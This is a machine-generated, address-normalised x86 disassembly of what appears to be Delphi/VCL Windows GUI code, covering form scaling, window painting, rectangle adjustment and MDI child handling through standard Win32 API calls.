mov eax [ ebp - 0x4 ]
call sub_44f220
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_43d604
mov bl 0x1
mov ecx eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44f220
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x270 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_43d604
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x25c ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x68 ]
mov eax esi
call sub_41c418
push eax
call MulDiv
mov edx eax
mov eax esi
call sub_41c420
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x268 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x26c ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fa ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fa ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fe ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fe ] eax
sub_44fe25
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43ae80
push 0x0
push 0x0
push ebx
push sub_44ff2c
mov cl [ ebx + 0x5e ]
xor cl 0x1
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push sub_44fef8
push ebx
push sub_44ff10
mov cl [ ebx + 0x5e ]
xor cl 0x1
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push r-xdata
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop edi
pop esi
pop ebx
retn
sub_44fed7
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov eax esi
call sub_416afc
test al al
je r-xdata
pop esi
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_437484
sub_44ff63
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add bl al
lea eax [ eax ]
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_44f220
mov ecx edi
mov edx esi
mov eax ebx
call sub_43d604
mov eax ebx
call sub_45004c
test al al
je r-xdata
push edi
push esi
mov ebp [ ebx + 0x68 ]
mov eax ebp
call sub_41c4bc
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_41c4d8
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_436da0
mov ebp eax
push edi
push esi
mov eax ebx
call sub_436d5c
push eax
call MulDiv
mov edx eax
mov eax ebx
call sub_4502f4
push edi
push esi
push ebp
call MulDiv
mov edx eax
mov eax ebx
call sub_450324
sub_44fff0
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax ebx
call sub_43db40
push eax
call IsIconic
test eax eax
je r-xdata
mov eax ebx
call sub_43de44
test al al
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
cmp [ ebx + 0x229 ] 0x3
je r-xdata
mov eax ebx
call sub_452350
push eax
push 0x1
push 0x80
mov eax ebx
call sub_43db40
push eax
call SendMessageA
pop ebx
retn
sub_450084
push ebx
mov ebx eax
mov eax ebx
call sub_450fa0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov al [ ebx + 0x229 ]
sub al 0x2
je r-xdata
mov al 0x1
sub al 0x3
je r-xdata
mov al 0x1
pop ebx
retn
xor eax eax
jmp r-xdata
cmp al [ ebx + 0x210 ]
jne r-xdata
sub_450118
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_43db40
push eax
call IsIconic
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_43dc08
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call SetRect
push 0xffffffec
mov eax ebx
call sub_43db40
push eax
call GetWindowLongA
push eax
cmp [ ebx + 0x248 ] 0x0
setne al
neg al
sbb eax eax
push eax
push 0xfffffff0
mov eax ebx
call sub_43db40
push eax
call GetWindowLongA
push eax
push esi
call AdjustWindowRectEx
mov eax [ ebx + 0x4c ]
sub eax [ esi + 0xc ]
add eax [ esi + 0x4 ]
push eax
mov eax [ ebx + 0x48 ]
sub eax [ esi + 0x8 ]
add eax [ esi ]
push eax
push 0x0
push 0x0
push esi
call SetRect
pop esi
pop ebx
retn
sub_4501a0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx esi
mov eax ebx
call sub_43e0e4
cmp ebx esi
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
mov eax ebx
call sub_419804
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
mov edx edi
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4197d8
mov edi eax
mov eax edi
mov si 0xfff1
call sub_403430
test al al
jne r-xdata
sub_45020c
push ebx
push esi
mov ebx eax
cmp [ ebx + 0xa0 ] 0x0
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov esi eax
mov eax ebx
call sub_40317c
cmp esi eax
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_450238
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov eax [ esp ]
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov eax ebp
call sub_43a870
sub [ esp + 0x4 ] eax
mov [ esp + 0x8 ] 0xffffffff
mov eax ebp
call sub_419804
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebp
call sub_43e12c
jmp r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
inc [ esp + 0x8 ]
mov eax [ esp + 0x8 ]
cmp eax [ esp + 0x4 ]
jne r-xdata
mov edx edi
mov eax ebp
call sub_4197d8
mov si 0xfff1
call sub_403430
test al al
jne r-xdata
mov edx edi
mov eax [ esp ]
call sub_419814
jmp r-xdata
sub_4502cc
push ebx
mov ebx eax
cmp dl [ ebx + 0x60 ]
je r-xdata
pop ebx
retn
mov eax ebx
call sub_437540
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_43850c
sub_4502f4
push ebx
mov ebx eax
test [ ebx + 0x54 ] 0x8
je r-xdata
mov eax ebx
call sub_436d74
pop ebx
retn
mov [ ebx + 0x268 ] edx
mov al [ r-xdata ]
or al [ ebx + 0x98 ]
mov [ ebx + 0x98 ] al
pop ebx
retn
sub_450324
push ebx
mov ebx eax
test [ ebx + 0x54 ] 0x8
je r-xdata
mov eax ebx
call sub_436db8
pop ebx
retn
mov [ ebx + 0x26c ] edx
mov al [ r-xdata ]
or al [ ebx + 0x98 ]
mov [ ebx + 0x98 ] al
pop ebx
retn
sub_450354
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi + 0x2f4 ] 0x1
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
mov edx ebx
mov eax esi
call sub_437278
cmp bl [ esi + 0x57 ]
je r-xdata
and [ esi + 0x2f4 ] 0xfd
pop esi
pop ebx
retn
or [ esi + 0x2f4 ] 0x2
jmp r-xdata
mov eax esi
call sub_45148c
pop esi
pop ebx
retn
sub_450398
push ebp
mov ebp esp
push 0x0
xor edx edx
push ebp
push r-xdata
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4503f8
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
cmp [ eax + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a6c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2a0
call sub_4039a8
sub_450400
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
cmp ebx esi
je r-xdata
test eax eax
jne r-xdata
mov edx esi
mov eax ebx
call sub_43722c
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax ebx
call sub_43b098
mov eax ebx
call sub_43b234
sub_450438
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_419650
cmp [ ebx + 0x250 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax [ ebx + 0x250 ]
mov ebx [ eax ]
call [ ebx + 0x2c ]
sub_450478
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
mov edx eax
cmp edx 0x46
jg r-xdata
sub edx 0xb01a
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
dec edx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x1c ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
add edx 0xfffffffa
sub edx 0x3
jb r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43b554
mov eax [ ebp - 0x4 ]
mov si 0xffb3
call sub_403430
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
dec eax
sub al 0x2
jae r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub edx 0x22
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffb1
call sub_403430
jmp r-xdata
cmp eax [ rw-data ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
sub al 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx ] 0x7
jne r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cmp [ eax ] 0x1
jne r-xdata
dec edx
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb025
mov eax [ ebp - 0x4 ]
call sub_43850c
push 0x0
xor ecx ecx
mov edx 0xb024
mov eax [ ebp - 0x4 ]
call sub_43850c
push 0x0
xor ecx ecx
mov edx 0xb035
mov eax [ ebp - 0x4 ]
call sub_43850c
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax [ ebp - 0x4 ]
call sub_43850c
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax [ ebp - 0x4 ]
call sub_43850c
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax [ ebp - 0x4 ]
call sub_43850c
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x229 ]
sub al 0x2
je r-xdata
sub al 0x2
jne r-xdata
mov eax [ ebx + 0x8 ]
or [ eax + 0x18 ] 0x2
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov esi [ ebx + 0x8 ]
cmp [ esi ] 0x1
jne r-xdata
jmp r-xdata
mov eax [ ebx + 0x8 ]
or [ eax + 0x18 ] 0x1
jmp r-xdata
sub al 0x3
jne r-xdata
xor esi esi
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
xor ecx ecx
call sub_44a594
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_450da4
test eax eax
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_41cb54
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0xc ]
call sub_41d23c
mov eax [ rw-data ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0xc ]
call sub_41d0dc
mov eax [ ebp - 0x14 ]
mov ax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
lea ecx [ eax + 0x1c ]
mov edx [ ebp - 0xc ]
mov eax edi
call sub_44ba7c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4506db
xor edx edx
mov eax [ ebp - 0xc ]
call sub_41d23c
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
mov edx [ esi + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
xor ecx ecx
call sub_44a594
mov edi eax
test edi edi
je r-xdata
test esi esi
je r-xdata
cmp eax [ ebp - 0x4 ]
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_450da4
call sub_43db40
mov esi eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_43db40
push eax
call GetWindowDC
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_41cb54
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
push eax
call SaveDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_41d23c
mov eax [ rw-data ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0xc ]
call sub_41d0dc
lea eax [ esi + 0x10 ]
push eax
lea ecx [ esi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4507e2
xor edx edx
mov eax [ ebp - 0xc ]
call sub_41d23c
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call RestoreDC
retn
push esi
call SetFocus
jmp r-xdata
call sub_43db40
mov esi eax
sub_4507ff
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43db40
push eax
call ReleaseDC
retn
sub_4508b0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x274 ]
push eax
call CallWindowProcA
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0xc ] eax
pop ebp
retn
sub_4508fc
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_450dd8
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_450e24
cmp [ eax + 0x22b ] 0x2
jne r-xdata
pop esi
pop ebx
pop ebp
retn
sub_45093c
push ebp
mov ebp esp
add esp 0xffffff8c
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
sub eax 0xf
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
sub eax 0x5
je r-xdata
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call BeginPaint
mov edx [ ebp - 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_41ca38
push eax
lea edx [ ebp - 0x6c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x6c ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call FillRect
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
sub eax 0x2b
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43b7f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call GetWindowRect
lea ecx [ ebp - 0x74 ]
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_436e9c
mov eax [ ebp - 0x74 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp - 0x70 ]
mov [ ebp - 0x58 ] eax
mov ecx [ ebp - 0x58 ]
neg ecx
mov edx [ ebp - 0x5c ]
neg edx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_435c94
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x254 ] 0x0
je r-xdata
push ebp
call sub_4508b0
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
sub eax 0x45
jne r-xdata
retn
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call EndPaint
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call GetClientRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_41ca38
push eax
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call FillRect
mov eax [ ebp - 0x4 ]
call sub_450dd8
test eax eax
je r-xdata
push ebp
call sub_4508b0
pop ecx
push ebp
call sub_4508b0
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
mov dl 0x1
push ebp
call sub_4508fc
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0xffffffff
jmp r-xdata
xor edx edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
call sub_44dc14
jmp r-xdata
sub_450b1c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
mov ebx eax
mov ecx esi
mov eax ebx
call sub_44ede4
mov eax [ ebx + 0x254 ]
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x14
mov ecx [ esi + 0xc ]
mov edi [ esi + 0x4 ]
sub ecx edi
push ecx
mov ecx [ esi + 0x8 ]
mov edx [ esi ]
sub ecx edx
push ecx
push edi
push edx
push 0x1
push eax
call SetWindowPos
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
push esp
mov eax [ ebx + 0x254 ]
push eax
call GetClientRect
test eax eax
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebx + 0x254 ]
push eax
call InvalidateRect
sub_450b88
push ebx
push esi
push edi
push ecx
mov ebx eax
mov eax ebx
call sub_44f480
mov eax ebx
call sub_43de44
test al al
je r-xdata
mov eax ebx
call sub_419804
mov edi eax
dec edi
test edi edi
jl r-xdata
push 0xffffffec
mov eax ebx
call sub_43db40
push eax
call GetWindowLongA
and eax 0xffffefff
and eax 0xffffdfff
and eax 0xffffbfff
mov [ esp ] eax
mov edx esp
mov eax ebx
call sub_43a964
mov eax [ esp ]
push eax
push 0xffffffec
mov eax ebx
call sub_43db40
push eax
call SetWindowLongA
pop edx
pop edi
pop esi
pop ebx
retn
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax ebx
call sub_4197d8
call sub_44b0d8
mov edx esi
mov eax ebx
call sub_4197d8
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
sub_450c20
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x244 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x244 ] 0x1
xor edx edx
push ebp
push r-xdata
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x244 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
jne r-xdata
mov dl [ eax + 0x5f ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ rw-data ]
mov dl [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
jmp r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
sub_450ca8
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x228 ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x228 ] al
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_43b0e0
sub_450cd4
push esi
mov esi eax
cmp dl [ esi + 0x229 ]
je r-xdata
pop esi
retn
mov eax edx
mov [ esi + 0x229 ] al
sub al 0x2
je r-xdata
mov dl 0x1
sub al 0x3
je r-xdata
mov eax esi
call sub_43b0e0
xor edx edx
jmp r-xdata
mov eax esi
call sub_44ef60
test [ esi + 0x1c ] 0x10
jne r-xdata
sub_450d0c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov edi [ ebx + 0x30 ]
mov esi [ ebx + 0xa0 ]
mov ecx esp
mov eax ebx
call sub_436b5c
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp edi eax
jne r-xdata
cmp esi [ ebx + 0xa0 ]
je r-xdata
mov eax ebx
call sub_43b0e0
sub_450d50
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0xa0 ]
je r-xdata
mov ecx edi
mov edx esi
mov eax ebx
call sub_436c68
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
test esi esi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov al [ ebx + 0x229 ]
mov [ ebx + 0x280 ] al
mov [ ebx + 0x229 ] 0x0
mov al [ ebx + 0x280 ]
mov [ ebx + 0x229 ] al
jmp r-xdata
sub_450da4
push ebx
mov ebx eax
xor eax eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
pop ebx
retn
cmp [ ebx + 0x254 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x229
mov eax [ ebx + 0x254 ]
push eax
call SendMessageA
call sub_434238
sub_450dd8
push ebx
push esi
push edi
xor edi edi
cmp [ eax + 0x22f ] 0x2
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0x254 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_454948
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
inc edi
mov edx esi
mov eax [ rw-data ]
call sub_454934
cmp [ eax + 0x22f ] 0x1
jne r-xdata
sub_450e24
push ebx
push esi
push edi
mov edi edx
cmp [ eax + 0x22f ] 0x2
jne r-xdata
xor eax eax
cmp [ eax + 0x254 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_454948
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
dec edi
test edi edi
jl r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_454934
cmp [ eax + 0x22f ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_450e74
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov edx [ ebp + 0x8 ]
mov [ eax + 0x4 ] edx
mov edx [ ebx + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx eax
mov eax ebx
call sub_4136e4
mov al 0x1
pop ebx
pop ebp
retn 0x10
sub_450ea4
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov ebp rw-data
xor eax eax
mov [ esp ] eax
push 0x2
mov eax ebx
call sub_43db40
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi eax
mov eax [ ebp ]
call sub_454918
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp ]
call sub_454918
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
push eax
mov eax sub_450e74
push eax
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp ]
call sub_454918
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_454904
mov [ esp ] eax
jmp r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
mov edx esi
call sub_413840
call sub_403234
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_454904
cmp edi [ eax + 0x4 ]
jne r-xdata
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_454904
mov [ esp ] eax
jmp r-xdata
mov edx esi
mov eax [ ebp ]
call sub_454904
cmp edi [ eax + 0x4 ]
jne r-xdata
sub_450fa8
push ebx
mov ebx eax
mov eax ebx
call sub_450fa0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x240 ]
call sub_421280
test eax eax
jne r-xdata
mov al 0x1
pop ebx
retn
sub_450fd0
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x22f ]
je r-xdata
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
